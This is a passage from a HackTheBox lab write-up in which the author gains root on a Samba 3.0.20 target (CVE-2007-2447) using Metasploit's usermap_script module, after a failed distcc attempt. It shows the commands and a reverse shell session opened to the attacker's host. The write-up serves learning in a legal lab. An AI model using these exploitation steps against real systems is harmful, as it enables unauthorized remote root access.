Used smbmap for enumerating SMB-Shares. The "tmp" directory is read and writeable. 

## checking SMB-Vulnerability

I have checked if the SMB-Version is vulnerabaly. Used namp with the command: --script smb-vuln* 

# Enumerating Port 3632

I tried to exploit Port 3632 with an Metasploit scirpt: distcc_exec

```sh

msf5 exploit(unix/misc/distcc_exec) > run

[-] 10.10.10.3:3632 - Exploit failed: An exploitation error occurred.
[*] Exploit completed, but no session was created.

```

But it failed and i was not able to get access to the target. After some tries, i gave up at this port. 

Maybe Samba is the way in. 

# Enumerating Samba smbd 3.0.20-Debian

I pay attention to this version of Samba and tried to look if there is any vulnerabily for this. 

After some research i came accross follwing articel on ragid7: https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script

There is a vulnerability in this version. You can bybass ther authentication without any username and password. 

CVE-Details: CVE-2007-2447

And there is a Metasploit-Module to exploit this vulnerability

```sh
msf5 > use exploit/multi/samba/usermap_script
```

Info Page of this module:

```sh
msf5 exploit(multi/samba/usermap_script) > info

       Name: Samba "username map script" Command Execution
     Module: exploit/multi/samba/usermap_script
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2007-05-14

Provided by:
  jduck <jduck@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Automatic

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT   139              yes       The target port (TCP)

Payload information:
  Space: 1024

Description:
  This module exploits a command execution vulnerability in Samba 
  versions 3.0.20 through 3.0.25rc3 when using the non-default 
  "username map script" configuration option. By specifying a username 
  containing shell meta characters, attackers can execute arbitrary 
  commands. No authentication is needed to exploit this vulnerability 
  since this option is used to map usernames prior to authentication!

```

## Exploit

For this exploit we only have to set the rhosts and run the exploit. 

```sh
msf5 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 10.10.14.34:4444 
[*] Command shell session 1 opened (10.10.14.34:4444 -> 10.10.10.3:34509) at 2020-10-30 00:25:19 +0100

id;whoami
uid=0(root) gid=0(root)
root
```

This exploit gave as root access to the Machine. 

Now we have root access we can check for the User.txt and the Root.txt file and submit it to HackTheBox. 

# Conclusion

I have to say, i was clueless about the enumeration of the weakness of this box. I had a hint, on an writeup of this box, that Samba is the way in. So i have payed more attention to this section. 

This was my first Box with this kind of vulenrability. I have learnd some new skills about samba and how i can exploit this kind of version.
